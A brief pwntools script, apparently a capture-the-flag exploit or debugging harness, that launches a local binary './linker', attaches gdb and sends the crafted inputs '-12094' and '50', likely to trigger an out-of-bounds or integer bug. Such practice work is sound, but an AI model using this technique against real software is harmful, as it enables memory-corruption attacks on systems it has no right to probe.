from pwn import *
io = process("./linker")

io.recvuntil("one of the values\n")
gdb.attach(io)
io.sendline("-12094")
io.sendline("50")

io.interactive()
